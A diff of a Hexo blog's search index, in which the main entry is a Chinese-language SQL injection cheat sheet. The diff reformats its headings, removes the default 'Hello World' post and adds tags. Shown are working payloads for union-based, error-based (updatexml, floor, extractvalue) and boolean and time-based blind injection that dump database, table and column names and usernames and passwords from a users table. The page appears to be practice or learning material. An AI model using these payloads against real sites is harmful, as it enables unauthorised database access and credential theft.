@@ -45,12 +45,15 @@ regexp、like语句</code></pre><p>#UNION SELECT</p>
 <pre><code>id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p>
 <pre><code>id=-1&apos; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><em>查询列名：</em></p>
 <pre><code>id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+</code></pre><p><em>查询字段值：</em></p>
-<pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><p>#基于报错注入<br>##updatexml报错注入<br><strong>updatexml(XML_document,XPath_String,new_value)</strong></p>
+<pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><p>#基于报错注入</p>
+<p>##updatexml报错注入</p>
+<p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p>
 <p><em>获取数据库名、版本信息：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+</code></pre><p><em>获取表名：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+</code></pre><p><em>获取列名：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x23),1)--+</code></pre><p><em>获取表users()中的用户名和密码：</em></p>
-<pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p>##floor报错注入<br><strong>floor(rand(0)*2)</strong></p>
+<pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p>##floor报错注入</p>
+<p><strong>floor(rand(0)*2)</strong></p>
 <p><em>爆库：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库
 或：
@@ -59,12 +62,14 @@ id=1&apos; union select 1 from (select count(*),concat(0x23,database(),0x23,floo
 id=1&apos; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+</code></pre><p><em>爆表：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+</code></pre><p><em>爆列名：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><em>爆字段值:</em></p>
-<pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p>##extractvalue报错注入<br><strong>extractvalue(xml_frag, xpath_expr)</strong></p>
+<pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p>##extractvalue报错注入</p>
+<p><strong>extractvalue(xml_frag, xpath_expr)</strong></p>
 <p><em>爆库：</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><em>爆表：</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><em>爆列名:</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)))--+</code></pre><p><em>爆字段：</em></p>
-<pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><p>#盲注<br>##基于布尔的盲注</p>
+<pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><p>#盲注</p>
+<p>##基于布尔的盲注</p>
 <pre><code>ascii()返回指定字符串最左侧字符的ascii值
 count()计算结果集的数量
 length()返回指定字符串的长度
@@ -109,23 +114,12 @@ id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版
 <pre><code>id=-1&apos; and union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1</code></pre><p><em>爆列名</em></p>
 <pre><code>id=-1&apos; and union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = &apos;admin&apos; limit 0,1</code></pre><p><em>爆数据</em></p>
 <pre><code>id=-1&apos; and union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1</code></pre>]]></content>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2019/10/16/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>数据库</tag>
+      </tags>
   </entry>
 </search>
